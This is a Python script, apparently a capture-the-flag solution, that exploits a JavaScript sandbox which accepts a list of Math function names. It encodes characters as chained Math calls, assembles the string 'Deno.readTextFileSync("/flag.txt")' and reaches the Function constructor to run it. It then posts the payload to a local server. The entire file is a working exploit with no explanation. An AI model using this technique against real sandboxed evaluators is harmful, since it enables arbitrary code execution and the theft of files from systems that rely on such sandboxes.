import httpx

INTEGER_COMBINATION = {
    0: "Math.clz32,Math.imul",
    1: "Math.clz32,Math.sign",
    2: "Math.clz32,Math.atan,Math.ceil",
    3: "Math.clz32,Math.cbrt,Math.floor",
    4: "Math.clz32,Math.cbrt,Math.ceil",
    5: "Math.clz32,Math.log2",
    6: "Math.clz32,Math.sqrt,Math.ceil",
    7: "Math.clz32,Math.sqrt,Math.exp,Math.acosh,Math.ceil",
    8: "Math.clz32,Math.exp,Math.sqrt,Math.clz32",
    9: "Math.clz32,Math.cosh,Math.sqrt,Math.clz32",
    10: "Math.clz32,Math.clz32,Math.cbrt,Math.cosh,Math.ceil",
    11: "Math.clz32,Math.cbrt,Math.cosh,Math.floor",
    12: "Math.clz32,Math.cbrt,Math.cosh,Math.ceil",
    13: "Math.clz32,Math.cosh,Math.log10,Math.floor",
    14: "Math.clz32,Math.cosh,Math.log10,Math.ceil",
    15: "Math.clz32,Math.log,Math.sinh,Math.floor",
    16: "Math.clz32,Math.log,Math.sinh,Math.ceil",
    17: "Math.clz32,Math.log,Math.cosh,Math.ceil",
    18: "Math.clz32,Math.log,Math.cbrt,Math.tan,Math.ceil",
    19: "Math.clz32,Math.clz32,Math.cbrt,Math.expm1,Math.ceil",
    20: "Math.clz32,Math.atan,Math.expm1,Math.cosh,Math.ceil",
    21: "Math.clz32,Math.cbrt,Math.floor,Math.exp,Math.ceil",
    22: "Math.clz32,Math.cbrt,Math.expm1,Math.floor",
    23: "Math.clz32,Math.cbrt,Math.expm1,Math.ceil",
    24: "Math.clz32,Math.cbrt,Math.exp,Math.ceil",
    25: "Math.clz32,Math.log2,Math.cosh,Math.clz32",
    26: "Math.clz32,Math.clz32",
    27: "Math.clz32,Math.clz32,Math.clz32",
    28: "Math.clz32,Math.cbrt,Math.cosh,Math.clz32",
    29: "Math.clz32,Math.acosh,Math.clz32",
    30: "Math.clz32,Math.cbrt,Math.clz32",
    31: "Math.clz32,Math.atan,Math.clz32",
    32: "Math.clz32",
    33: "Math.clz32,Math.log1p,Math.exp",
    34: "Math.clz32,Math.log10,Math.expm1,Math.exp,Math.ceil",
    35: "Math.clz32,Math.exp,Math.cbrt,Math.cbrt,Math.floor",
    36: "Math.clz32,Math.exp,Math.cbrt,Math.cbrt,Math.ceil",
    37: "Math.clz32,Math.clz32,Math.cosh,Math.log2,Math.ceil",
    38: "Math.clz32,Math.atan,Math.expm1,Math.expm1,Math.ceil",
    39: "Math.clz32,Math.atan,Math.expm1,Math.exp,Math.ceil",
    40: "Math.clz32,Math.cos,Math.expm1,Math.exp,Math.exp,Math.ceil",
    41: "Math.clz32,Math.exp,Math.log10,Math.sqrt,Math.expm1,Math.ceil",
    42: "Math.clz32,Math.log,Math.log2,Math.tan,Math.cosh,Math.ceil",
    43: "Math.clz32,Math.cbrt,Math.sinh,Math.cosh,Math.cbrt,Math.ceil",
    44: "Math.clz32,Math.cbrt,Math.cosh,Math.cosh,Math.cbrt,Math.ceil",
    45: "Math.clz32,Math.cosh,Math.log2,Math.floor",
    46: "Math.clz32,Math.cosh,Math.log2,Math.ceil",
    47: "Math.clz32,Math.exp,Math.log2,Math.ceil",
    48: "Math.clz32,Math.log1p,Math.cbrt,Math.exp,Math.cosh,Math.ceil",
    49: "Math.clz32,Math.sign,Math.expm1,Math.expm1,Math.cosh,Math.ceil",
    50: "Math.clz32,Math.clz32,Math.acosh,Math.expm1,Math.floor",
    51: "Math.clz32,Math.clz32,Math.acosh,Math.expm1,Math.ceil",
    52: "Math.clz32,Math.clz32,Math.acosh,Math.exp,Math.ceil",
    53: "Math.clz32,Math.atan,Math.exp,Math.cosh,Math.ceil",
    54: "Math.clz32,Math.cbrt,Math.ceil,Math.expm1,Math.ceil",
    55: "Math.clz32,Math.cbrt,Math.ceil,Math.exp,Math.ceil",
    56: "Math.clz32,Math.clz32,Math.log2,Math.cosh,Math.ceil",
    57: "Math.clz32,Math.log2,Math.sqrt,Math.cosh,Math.cosh,Math.ceil",
    58: "Math.clz32,Math.sign,Math.tan,Math.exp,Math.cosh,Math.ceil",
    59: "Math.clz32,Math.clz32,Math.clz32,Math.log2,Math.cosh,Math.ceil",
    60: "Math.clz32,Math.cbrt,Math.clz32,Math.acosh,Math.exp,Math.ceil",
    61: "Math.clz32,Math.cbrt,Math.expm1,Math.sqrt,Math.cosh,Math.ceil",
    62: "Math.clz32,Math.acosh,Math.expm1,Math.floor",
    63: "Math.clz32,Math.acosh,Math.expm1,Math.ceil",
    64: "Math.clz32,Math.acosh,Math.exp,Math.ceil",
    65: "Math.clz32,Math.asinh,Math.exp,Math.ceil",
    66: "Math.clz32,Math.cos,Math.cosh,Math.tan,Math.cosh,Math.ceil",
    67: "Math.clz32,Math.cbrt,Math.exp,Math.sqrt,Math.cosh,Math.ceil",
    68: "Math.clz32,Math.clz32,Math.cosh,Math.sqrt,Math.cbrt,Math.ceil",
    69: "Math.clz32,Math.sqrt,Math.cbrt,Math.expm1,Math.cosh,Math.floor",
    70: "Math.clz32,Math.sqrt,Math.cbrt,Math.expm1,Math.cosh,Math.ceil",
    71: "Math.clz32,Math.atan,Math.clz32,Math.log2,Math.cosh,Math.ceil",
    72: "Math.clz32,Math.sqrt,Math.cosh,Math.log,Math.cosh,Math.ceil",
    73: "Math.clz32,Math.sqrt,Math.cosh,Math.log1p,Math.cosh,Math.ceil",
    74: "Math.clz32,Math.log2,Math.cosh,Math.floor",
    75: "Math.clz32,Math.log2,Math.cosh,Math.ceil",
    76: "Math.clz32,Math.log1p,Math.exp,Math.tan,Math.floor",
    77: "Math.clz32,Math.clz32,Math.exp,Math.sqrt,Math.cbrt,Math.ceil",
    78: "Math.clz32,Math.acosh,Math.tan,Math.exp,Math.cosh,Math.ceil",
    79: "Math.clz32,Math.cos,Math.exp,Math.cosh,Math.cosh,Math.ceil",
    80: "Math.clz32,Math.log1p,Math.log2,Math.expm1,Math.cosh,Math.floor",
    81: "Math.clz32,Math.clz32,Math.sqrt,Math.cosh,Math.floor",
    82: "Math.clz32,Math.clz32,Math.sqrt,Math.cosh,Math.ceil",
    83: "Math.clz32,Math.clz32,Math.log2,Math.tan,Math.floor",
    84: "Math.clz32,Math.clz32,Math.log2,Math.tan,Math.ceil",
    85: "Math.clz32,Math.log1p,Math.sinh,Math.expm1,Math.tan,Math.ceil",
    86: "Math.clz32,Math.log2,Math.log2,Math.cosh,Math.cosh,Math.ceil",
    87: "Math.clz32,Math.acosh,Math.log1p,Math.exp,Math.cosh,Math.ceil",
    88: "Math.clz32,Math.asinh,Math.log1p,Math.exp,Math.cosh,Math.ceil",
    89: "Math.clz32,Math.log10,Math.exp,Math.expm1,Math.floor",
    90: "Math.clz32,Math.log10,Math.exp,Math.expm1,Math.ceil",
    91: "Math.clz32,Math.log10,Math.exp,Math.exp,Math.ceil",
    92: "Math.clz32,Math.cbrt,Math.expm1,Math.log2,Math.exp,Math.ceil",
    93: "Math.clz32,Math.cosh,Math.log10,Math.exp,Math.cbrt,Math.ceil",
    94: "Math.clz32,Math.sqrt,Math.cosh,Math.cbrt,Math.cosh,Math.ceil",
    95: "Math.clz32,Math.log1p,Math.cbrt,Math.exp,Math.expm1,Math.ceil",
    96: "Math.clz32,Math.log1p,Math.cbrt,Math.exp,Math.exp,Math.ceil",
    97: "Math.clz32,Math.log10,Math.cosh,Math.sinh,Math.cosh,Math.ceil",
    98: "Math.clz32,Math.sign,Math.expm1,Math.expm1,Math.exp,Math.ceil",
    99: "Math.clz32,Math.log2,Math.expm1,Math.cbrt,Math.cosh,Math.ceil",
    100: "Math.clz32,Math.log2,Math.exp,Math.cbrt,Math.cosh,Math.ceil",
    101: "Math.clz32,Math.log2,Math.sqrt,Math.sinh,Math.expm1,Math.ceil",
    102: "Math.clz32,Math.log2,Math.sqrt,Math.sinh,Math.exp,Math.ceil",
    103: "Math.clz32,Math.exp,Math.log10,Math.exp,Math.cbrt,Math.ceil",
    104: "Math.clz32,Math.atan,Math.exp,Math.expm1,Math.floor",
    105: "Math.clz32,Math.atan,Math.exp,Math.expm1,Math.ceil",
    106: "Math.clz32,Math.atan,Math.exp,Math.exp,Math.ceil",
    107: "Math.clz32,Math.log10,Math.cosh,Math.cosh,Math.cosh,Math.ceil",
    108: "Math.clz32,Math.clz32,Math.log2,Math.expm1,Math.floor",
    109: "Math.clz32,Math.clz32,Math.log2,Math.expm1,Math.ceil",
    110: "Math.clz32,Math.clz32,Math.log2,Math.exp,Math.ceil",
    111: "Math.clz32,Math.clz32,Math.log2,Math.exp,Math.exp,Math.acosh,Math.ceil",
    112: "Math.clz32,Math.log2,Math.sqrt,Math.cosh,Math.expm1,Math.floor",
    113: "Math.clz32,Math.sqrt,Math.cosh,Math.tan,Math.cosh,Math.ceil",
    114: "Math.clz32,Math.log2,Math.sqrt,Math.cosh,Math.exp,Math.ceil",
    115: "Math.clz32,Math.log,Math.sqrt,Math.expm1,Math.cosh,Math.ceil",
    116: "Math.clz32,Math.sqrt,Math.sqrt,Math.cosh,Math.cosh,Math.ceil",
    117: "Math.clz32,Math.clz32,Math.clz32,Math.log2,Math.exp,Math.ceil",
    118: "Math.clz32,Math.log,Math.sinh,Math.floor,Math.cosh,Math.cbrt,Math.ceil",
    119: "Math.clz32,Math.cbrt,Math.clz32,Math.sqrt,Math.cosh,Math.floor",
    120: "Math.clz32,Math.cbrt,Math.clz32,Math.sqrt,Math.cosh,Math.ceil",
    121: "Math.clz32,Math.log1p,Math.sqrt,Math.expm1,Math.cosh,Math.ceil",
    122: "Math.clz32,Math.imul,Math.acos,Math.exp,Math.expm1,Math.ceil",
    123: "Math.clz32,Math.cbrt,Math.asinh,Math.expm1,Math.cosh,Math.ceil",
    124: "Math.clz32,Math.sqrt,Math.expm1,Math.cosh,Math.log10,Math.ceil",
    125: "Math.clz32,Math.acosh,Math.expm1,Math.acosh,Math.expm1,Math.ceil",
    126: "Math.clz32,Math.log2,Math.cbrt,Math.exp,Math.cosh,Math.ceil",
}

ASCII_COMBINATION = {}

for cmb in INTEGER_COMBINATION:
    # from char code
    ASCII_COMBINATION.update(
        {chr(cmb): INTEGER_COMBINATION[cmb]+",Math.sin.name.constructor.fromCharCode"})


def get_char(chr):
    # push to seeds
    return ASCII_COMBINATION[chr]+",Math.seeds.push"


def get_str(txt):
    result = ""
    for i in txt:
        char = get_char(i)
        result += char
        # return to 0
        result += ",Math.ceil,Math.sin,Math.abs,"
    return result


payload = 'Math.seeds.pop,'*5  # remove seeds
# make string
payload += get_str('''self.postMessage({message:Deno.readTextFileSync("/flag.txt")})''')
# join all string
payload += ",Math.sin,Math.abs,Math.floor,Math.seeds.constructor,Math.seeds.join"
# call it
payload += ",Math.constructor.constructor,Math.seeds.sort"

payload = [i for i in payload.split(",")]

res = httpx.post("http://localhost:8080/", json=payload)
print(res.text)
